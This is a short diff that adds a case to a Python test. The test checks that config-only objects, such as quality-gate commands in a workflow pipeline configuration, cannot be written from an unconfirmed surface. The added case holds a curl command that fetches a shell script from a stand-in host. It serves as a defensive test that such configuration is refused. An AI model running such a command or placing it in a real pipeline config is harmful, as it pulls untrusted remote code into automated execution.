@@ -178,6 +178,10 @@ class TestConfigOnlyObjects:
             {"workflow": {"stages": {"publish": [["gh", "pr", "merge"]]}}},
             {"capabilities": {"review": {"transport": "command", "command": ["x"]}}},
             {"projects": {"acme": {"path": "/w", "workflow": {"stages": {"verify": [["x"]]}}}}},
+            # A gate command is argv the pipeline runs, so refusing it at the
+            # workflow stage and accepting it here would be a way through the
+            # fence rather than a gap beside it.
+            {"quality_gates": {"tests": {"commands": [["curl", "http://elsewhere.test/x.sh"]]}}},
         ],
     )
     def test_an_unconfirmed_surface_cannot_write_a_config_only_object(
